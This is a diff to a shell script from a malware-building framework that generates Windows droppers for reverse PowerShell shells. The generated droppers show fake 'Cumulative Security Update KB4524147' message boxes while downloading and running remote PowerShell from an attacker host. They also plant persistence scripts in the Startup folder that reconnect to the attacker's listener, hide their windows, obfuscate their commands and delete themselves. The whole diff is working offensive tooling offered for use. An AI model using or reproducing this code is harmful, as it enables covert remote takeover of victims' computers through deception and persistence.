@@ -12322,7 +12322,7 @@ cat << !
     DESCRIPTION        : Reverse OpenSSL Powershell Shell
     TARGET SYSTEMS     : Windows (8|8.1|10)
     LOLBin             : Powershell (DownloadFile)
-    DROPPER EXTENSION  : BAT|VBS
+    DROPPER EXTENSION  : BAT
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : AVAILABLE
 
@@ -12331,7 +12331,7 @@ cat << !
     DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
     TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     LOLBin             : Powershell (DownloadFile)
-    DROPPER EXTENSION  : .CRDOWNLOAD.BAT|VBS (MITRE T1036)
+    DROPPER EXTENSION  : .CRDOWNLOAD.BAT (MITRE T1036)
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : AVAILABLE
 
@@ -12599,18 +12599,17 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" 
    echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
-   echo "Start-Sleep -Seconds 2;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
+   echo "Start-Sleep -Seconds 2;PoWeRsHeLl -W 1 -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
 else
    echo "${BlueF}[☠]${white} Building Obfuscated vbs dropper ..${white}";sleep 2
    ## Silent Execution -> OBFUSCATION=ON (none PS terminal window pops up)
    # REMARK: A MessageBox will pop up announcing that are KB updates available.
-   echo "' Framework: venom v1.0.17 (amsi evasion)" > $IPATH/output/$Drop.vbs
-   echo "Dim domain,x,u" >> $IPATH/output/$Drop.vbs
+   echo "Dim domain,x,u" > $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
    echo "domain = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
-   echo "x=MsgBox(\"This Security Patch Adresses CVE-2020-12067\"  & vbCrLf & \"RCE Vulnerability Under OS Builds 18362.535\" ,0+48, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
-   echo "objShell.Run \"cmd /c powershell \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0, True" >> $IPATH/output/$Drop.vbs
-   echo "u=MsgBox(\"Security Update Successfully Installed ..\" ,0+64, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
+   echo "x=MsgBox(\"Security updates available.\" & vbCrLf & \"Do you wish to install them now?\",4+48,\"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
+   echo "CreateObject(\"WScript.Shell\").Exec \"powershell -W 1 \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\"" >> $IPATH/output/$Drop.vbs
+   echo "u=MsgBox(\"Security Updates Successfully Installed ..\",0+64,\"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
 fi
 
 
@@ -12806,8 +12805,7 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
-      echo "echo CreateObject(\"WScript.Shell\").Exec \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
+      echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
@@ -12817,14 +12815,15 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
       echo "echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo netstat -ano^|findstr \"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    fi
-   echo "PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
+   echo "Exit" >> $IPATH/output/$Drop.bat
 fi
 
 
@@ -13054,8 +13053,7 @@ else
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
-      echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo CreateObject(\"WScript.Shell\").Exec \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
+     echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
@@ -13065,14 +13063,15 @@ else
       echo "echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo netstat -ano^|findstr \"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    fi
-   echo "PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat 
+   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat 
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
+   echo "Exit" >> $IPATH/output/$Drop.$ext.bat
 fi
 
 
@@ -13729,7 +13728,7 @@ echo "---"
 cd $IPATH/output
 ## BUILD DROPPER (to download/execute our agent.ps1).
 # $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/Client.ps1',$false);$proxy.send();iex $proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- FILELESS DELIVERY METHOD (dropper)
-echo "${BlueF}[☠]${white} Building Batch script dropper ..${white}";sleep 2
+echo "${BlueF}[☠]${white} Building Batch|HTA script dropper ..${white}";sleep 2
 ## Extract Dropper FullName
 FullName=$(echo "$Drop.$Ext"|cut -d '.' -f1|cut -d '-' -f2)
 if [ "$easter_egg" = "ON" ]; then
@@ -13749,6 +13748,7 @@ else
    echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D %@$%IS_MIN%@$%IMI%,;f%ZE%i?%D se%@'$%t IS_MIN%_#t%IM%'$%IZ%@=i%ED=1 &%@_$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $IPATH/output/$Drop.$Ext
    echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%,;$%eC%'$%t -Co%()%m^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Wi%@$%n%@%do%_$%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
    echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eC%('i')%t -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%po%'$%ns%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
+   echo "@Ti%@i%m^Eo%(0)%U^t /%@l%T 2 >n%_i_uL &%@$%& D^e%d0b@%L /F /%@$%Q $Drop.$Ext" >> $IPATH/output/$Drop.$Ext # <-- delete script at the end of execution
    echo "=Exit" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Obfuscated Batch Dropper written to output.";sleep 1
 fi
